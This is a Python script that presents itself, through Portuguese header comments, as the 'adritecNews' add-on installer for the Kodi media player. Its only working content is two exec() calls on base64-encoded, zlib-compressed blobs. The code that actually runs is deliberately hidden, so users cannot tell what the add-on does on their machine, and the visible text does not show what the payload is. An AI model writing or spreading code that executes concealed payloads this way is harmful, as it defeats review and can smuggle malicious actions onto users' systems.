#!/usr/bin/python
# -*- coding: utf-8 -*-
#                 -*- adritecNews -*-                      #
#----------------------------------------------------------#
#  INSTALADOR DE ADD-ONS PARA O KODI XBMC - VERSÃO: 2.0.0  #
#----------------------------------------------------------#
# KODI: GPL https://pt.wikipedia.org/wiki/Kodi             #   
# KODI WIKI: https://kodi.wiki/view/Main_Page              #
# PROGRAMAÇÃO: PYTHON: https://docs.python.org/2/tutorial/ #
# CONTATO: adritec_dados@yahooo.com.br                     #
# CANAL: http://YouTube.com/adritecnews                    # 
# SITE: http://adritecnews.com                             #
#----------------------------------------------------------#
#     TODOS OS DIREITOS RESERVADOS: adritecNews 2018       #
#                                                          #
#      Este trabalho está licenciado sob uma Licença       #
#Creative Commons Atribuição-NãoComercial-SemDerivações 4.0# 
#      Internacional. Para ver uma cópia desta licença,    # 
# visite http://creativecommons.org/licenses/by-nc-nd/4.0/ #
#       'Atribuição-Não-Comercial-SemDerivativos 4.0       # 
#             Internacional (CC BY-NC-ND 4.0)'             #
#----------------------------------------------------------#
#                "ATENÇÃO INTERNAUTAS"                     #
#                                                          #
#       FICA PROIBIDO CÓPIA, MODIFICAÇÃO, DIVULGAÇÃO       #
#                SEM MINHA ALTORIZAÇÃO                     #
#    Add-on desenvolvido para fazer AJUSTES no seu KODI,   #
#   para Inscritos e não inscritos do canal adritec News.  #
#----------------------------------------------------------#
import zlib
import base64
def decode_base64( b64string ):
    decoded_data = base64.b64decode( b64string )
    return zlib.decompress( decoded_data , -15)
def base64_encode( string_val ):
    zlibbed_str = zlib.compress( string_val )
    compressed_string = zlibbed_str[2:-4]
    return base64.b64encode( compressed_string )
	
exec(decode_base64('nZLLboMwEEX3/grvHFRkpCxbZdNVN5EqNV1XAzgwkV/ymD7+vgaHVK1oRMsCLqOZM9cX0HgXIn+vTVNOd2hbZ7PsBszC66HDVHRUcvqgXHw9JtFpVzPMDOqHiHp+G4LWWG/L/JyrQc3KEWOxH0xtAfUjxJ7vJqyMASxpiGosbgR51SDo26q6dJMo7lgDTa/Oc46kT0qeHNrNdUjvjBJFycU0LwoWlfHr1qfG1D/ls7T3PyYmWDpOKXLE0gfXBTAS2oBRNVa9EVqKoPXcylqIUAOpVabn5jR3eHje3z/xdO340tQ3/z/MVgOpMLKqw9dHKIUoznm8YJuoqw/BjmAh/QOL7q/6yIBK8Bt+WZxyzDx58t1oCRtn/a/p/JWf8CNwK70d6Z8='))	
exec(decode_base64('7VjvauNGEP9sP8VWR5BMjZS7oxQMbknSgxaS5rhzQyEEs5bG9l6kXZ12lSb3qc/SfigU+gT91rxJn6Szq7+WZVvnpCmUGzCB3ZnRzOxvfjubvh9SKYlP/SW84iq5G/UJSgBzMp0yztR06kgI50PCaQRsSGKqlmyQaWnRm67eI+NMZXVHq+OOser3tVs/BJqc6O85kQhgbN9AMhMSbHRqbNmcCGkMXbhlUknHRPcaFwbj8SRJYaTVyu/MRUISIdSQBCyRQzJnIUjCuPbyEw2va+ZV2MYQFae+SLnCCA83bX0+JiFwx3gdrChhoDW9r8hhnkBTdIBzHZDxMWrV0VJWf5PgB505GY+JdTuLfDcUC4sY3+WSCAOzPBgRX3DFeApbPWKJUh4yfu0UJX8nGHeycs4Hg43GcOtDrLaHGyOyNhYk0AXRB/aAeshlqljoJpFKANoyCP6tDLSsbEAoYd1Xab+OaQVRvD+kS+tPiG7IJ0Q/GaLN+SxAnQgeXDDJZixk6s6x5Z1EfLpxSBXWJXKPJhcv7BpSqbp5MTWkPKWI05UsbS9O2A1V4N3QxIsE+gTvlM0Smtx55taQ3lEchzC58C5YAMKzh8Q+V0tI7Koy3RupHssjNtPOrnpQW+2F8Y4QfRACPwZAWmrVnz0OEk6FT8MjHrwBrmj4UEjMPkGCPA0k1lTLhXI0ZXhMY3J5tZXf1u11kqAnW51o3VkViBlJ8yPPB1bDbSqhXCKLmeHRMU5M7lW2LbNqw1fr/V7EtX1sbXpar9wWPDa2N9/5eRrd4FgE3gWSWva+jTtCU8uD4KllbbMdplpar89++W7RDxo9upRvmlEGJLgFP1UwS1moNLX9eHx24n4vFJsznyomuHOACKh+A5scEMe+PDk/PX9DSMgiuLo8vvr7518uveOrS8+sX+XbCxyR9O5rKhUlhhnrWjZBWsxVBQJ6YVz99Wddh+CKMcSHXwiKBgKHrYi8TX2QUmjNz4ybLw4PD5FlGU5iBpGDsnzmaWeMYbJMoxmnLJSdH3iqMFmdiFcq/QyhQHESzJtzkTL3G7PgDBp66D9Tde9AcuFYRzFd0ISwiC6AS2tIrFdSUiLi+9/ufxWE6m2iRECRhvCX67mu1rwQ/v3vmJmEd5TM6QdAP1iTr622dtw5tq/k2Q6xHT3dUNne13m1G729ht82syKfrp2+c7TVsjcdaOky3moprpO69Dchb/LtD2fHb/Eoej2dQQ//9nYeY80ItVfPq7G0ej568xk5ExJvFkLJ+5Tiiyagge47QpP3KbsR0mi1MHLPSONMejtLWplVfNqNM3u9ouTowDAf/u2Xh40Vg1v1/GVzcAuoojMqzaU5tCaokyYgn790g5mlnVYRZ/bZqVefqj8x/lNCPaMcv8ENSezDqN9lPIKphen9H5pdWkn1y42kmrFqnCYLLKZ/jd42UWqus2l0sWUMPlLiyPOWIgKPBoHg0otzp/mYvJ1fd3ZFGcMjDc2bibzoFBJQ3e2KDk1l3Q8s1pR9EFQawPV/DRK80aRrHVTfQ7XMmSby2qT4pBkWsp2iW6+ZXbT80UzbYeDaa9Dqem3XdV1x7Vj17rOK4+I4mRRn6+IFPfhfEEU2ueG3YtqdIv4B'))